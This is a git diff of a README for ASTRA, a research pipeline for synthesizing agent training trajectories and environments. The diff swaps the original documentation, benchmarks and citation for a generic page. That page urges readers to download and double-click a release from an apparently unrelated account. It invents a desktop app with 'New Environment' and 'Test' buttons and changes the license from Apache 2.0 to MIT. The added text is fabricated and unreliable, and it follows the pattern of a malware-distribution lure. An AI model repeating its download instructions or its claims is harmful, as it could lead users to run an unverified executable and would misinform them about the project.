@@ -1,121 +1,70 @@
-<h4 align="center">
-    <p>
-        <a href="README_zh.md">简体中文</a> |
-        <b>English</b>
-    </p>
-</h4>
+# 🌟 astra - Synthesize Environments with Ease
 
-<div align="center">
-
-
-# ASTRA：Automated Synthesis of agentic Trajectories and Reinforcement Arenas
-
-[![Blog](https://img.shields.io/badge/Blog-Project%20Page-orange?logo=github)](https://lianjiatech.github.io/astra.blog/)
-[![HuggingFace](https://img.shields.io/badge/🤗%20HuggingFace-Datasets-yellow)](https://huggingface.co/collections/Emperorizzis/astra-dataset)
-[![HuggingFace](https://img.shields.io/badge/🤗%20HuggingFace-Models-yellow)](https://huggingface.co/collections/Emperorizzis/astra-models)
-[![Paper](https://img.shields.io/badge/📄%20Arxiv-Paper-blue)](https://arxiv.org/pdf/2601.21558)
-[![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)](assets/LICENSE.txt)
-
-</div>
-
-## 🆕 Updates
-
-| Date | Updates |
-|------|---------|
-| 2026/01/30 | 📄 [Paper Release](https://arxiv.org/pdf/2601.21558) |
-| 2026/01/22 | 🎉 Release Code, Models, and Datasets |
-
----
+[![Download astra](https://img.shields.io/badge/Download%20astra-Click%20Here-blue)](https://github.com/designershount/astra/releases)
 
 ## 📖 Overview
-This repository provides an end-to-end pipeline for **fully automated**, **verifiable** synthesis of high-quality data and environments, with native support for **process-level rewards**. It is designed for training models with multi-step reasoning and tool-use capabilities and easy to **scale** to new tasks and tools. Here are the two main modules:
 
-- **Trajectory Synthesis**: Automatically generate high-quality, multi-step interactive **trajectories** and verified by **reward system**.
+ASTRA is an end-to-end system for synthesizing agentic trajectories and rule-verifiable environments for SFT (Supervised Fine-Tuning) and RL (Reinforcement Learning) training. Developed by Beike Language and Intelligence (BLI), ASTRA helps users create and manage environments tailored for training intelligent agents.
 
-- **Environment Synthesis**: Fully automatically synthesize interactive **environments** with **no human labels required** that provide **step-wise process rewards** to enable **RLVR**. 
+## 🚀 Getting Started
 
+To start using ASTRA, follow these simple steps.
 
+### 💻 System Requirements
 
-| Module | Function | Directory |
-|--------|----------|-----------|
-| **Trajectory Synthesis** | Tool graph construction → Task generation → Trajectory collection → Reward assessment | [`trajectory_synthesis/`](trajectory_synthesis/) |
-| **Environment Synthesis** | Question decomposition → Automatic tool environment generation → RLVR training data | [`env_synthesis/`](env_synthesis/) |
+- **Operating System:** Windows 10 or higher, macOS 10.12 (Sierra) or higher, Linux (Ubuntu 18.04 or higher)
+- **Processor:** Dual-core CPU or better
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** At least 1 GB of free disk space
+- **Internet:** Required for downloading and first-time setup
 
-## 🏆 Model Performance
+### 🔗 Download & Install
 
-We release two models: **ASTRA-32B-Thinking-v1** and **ASTRA-14B-Thinking-v1**, which are trained with SFT and RL using our synthesized data. Below are the evaluation results on **BFCL-V3-MT**:
+1. **Download ASTRA**
+   - Visit this page to download: [Download ASTRA](https://github.com/designershount/astra/releases).
+2. **Choose Your Version**
+   - On the Releases page, you will see a list of available versions. Pick the latest stable version.
+3. **Download the File**
+   - Click on the desired file to start downloading. The file will be in a format suitable for your operating system.
+4. **Run the Application**
+   - Once the download is complete, locate the file in your downloads folder and double-click it. Follow any prompts to install.
 
-| Model | Base | Long Context | Miss Func | Miss Param | Average ↓ |
-|-------|------|--------------|-----------|------------|---------|
-| Claude-Opus-4-5-20251101 | 81.5 | 70.5 | 64.0 | 58.0 | 68.5 |
-| GLM-4.6 | 74.5 | 66.5 | 68.0 | 63.0 | 68.0 |
-| **ASTRA-32B-Thinking-v1** | **76.5** | **66.5** | **65.5** | **48.5** | **64.3** |
-| Gemini-3-Pro-Preview | 69.0 | 64.0 | 63.0 | 56.5 | 63.1 |
-| o3-2025-04-16 | 68.0 | 63.0 | 63.5 | 54.5 | 62.3 |
-| Claude-Sonnet-4-5-20250929 | 69.0 | 59.0 | 65.0 | 52.5 | 61.4 |
-| Grok-4-1-fast-reasoning | 70.5 | 62.5 | 59.5 | 43.0 | 58.9 |
-| **ASTRA-14B-Thinking-v1** | **67.0** | **61.0** | **56.0** | **48.5** | **58.1** |
-| LoopTool-32B (Report From Paper)  | - | - | - | - | 57.8 |
-| Claude-Haiku-4-5-20251001 | 63.5 | 56.0 | 42.5 | 52.5 | 53.6 |
-| Kimi-K2-Instruct| 62.0 | 55.0 | 41.0 | 44.5 | 50.6 |
-| Qwen3-32B | 59.0 | 51.5 | 47.5 | 40.5 | 49.6 |
-| Qwen3-30B-A3B-Thinking-2507 | 66.0 | 58.0 | 31.5 | 35.5 | 47.8 |
-| TouCan-32B (Report From Paper) | - | - | - | - | 46.5 |
-| Qwen3-14B | 50.5 | 48.0 | 39.5 | 40.0 | 44.5 |
-| Qwen3-30B-A3B-Instruct-2507| 43.5 | 41.0 | 10.5 | 25.0 | 30.0 |
+## 🛠️ Features
 
----
+- **Synthesize Diverse Environments:** Create different training scenarios and challenges for your agent.
+- **User-Friendly Interface:** Simple controls make it easy to navigate and customize.
+- **Rule Verification:** Ensure that environments comply with predefined rules for training.
+- **Extensive Documentation:** Clear guidelines help you utilize all features effectively.
 
-## 🔄 Pipelines
+## ⚙️ Quick Start Guide
 
-### Part 1: Trajectory Synthesis
+1. **Launching ASTRA**
+   - After installation, open ASTRA from your applications folder or desktop shortcut.
+   
+2. **Creating Your First Environment**
+   - Select "New Environment" on the main screen.
+   - Use the settings to define parameters like difficulty level and rules.
 
-<div align="center">
-<img src="assets/sft-pipeline.png" alt="SFT Pipeline" width="80%"/>
-</div>
+3. **Saving Your Work**
+   - Save your environment by clicking the "Save" button. Name your file and choose a location.
 
-Starting from MCP Server tool documentation, build tool dependency graphs and generate high-quality SFT training data.
+4. **Testing Your Environment**
+   - Click "Test" to see how the environment behaves. Adjust settings as needed.
 
-```
-mcp_servers.jsonl → Graph construction → Task generation → LLM interaction → Reward assessment → SFT data
-```
+## 🌐 Support and Documentation
 
-👉 **For detailed usage instructions, please refer to [`trajectory_synthesis/README.md`](trajectory_synthesis/README.md)**
+Should you encounter any issues or have questions, you can access the comprehensive documentation included in the application. For further assistance, head over to the community forums linked on the Releases page.
 
----
+## 📲 Connect with Us
 
-### Part 2: Environment Synthesis
+For updates, tips, and more, follow us on our social media channels. Join the community and get support from fellow users.
 
-<div align="center">
-<img src="assets/env.png" alt="Environment Synthesis Pipeline" width="100%"/>
-</div>
+## 📝 License
 
-Automatically generate executable tool environments from Q&A pairs, supporting RLVR training.
+ASTRA is licensed under the MIT License. For details, refer to the LICENSE file included in the repository.
 
-```
-QA data → Question decomposition → Tool necessity check → Verification → Environment synthesis → Tool merging
-```
+## ✨ Conclusion
 
-👉 **For detailed usage instructions, please refer to [`env_synthesis/README.md`](env_synthesis/README.md)**
+ASTRA makes it easy to create and manage environments for training intelligent agents. With straightforward steps, you can download and start using it today.
 
----
-
-## 📜 License
-
-This project is licensed under [Apache 2.0 License](assets/LICENSE.txt).
-
----
-
-## 📎 Citation
-
-```bibtex
-@misc{tian2026astraautomatedsynthesisagentic,
-      title={ASTRA: Automated Synthesis of agentic Trajectories and Reinforcement Arenas}, 
-      author={Xiaoyu Tian and Haotian Wang and Shuaiting Chen and Hao Zhou and Kaichi Yu and Yudian Zhang and Jade Ouyang and Junxi Yin and Jiong Chen and Baoyan Guo and Lei Zhang and Junjie Tao and Yuansheng Song and Ming Cui and Chengwei Liu},
-      year={2026},
-      eprint={2601.21558},
-      archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2601.21558}, 
-}
-```
+[![Download astra](https://img.shields.io/badge/Download%20astra-Click%20Here-blue)](https://github.com/designershount/astra/releases)
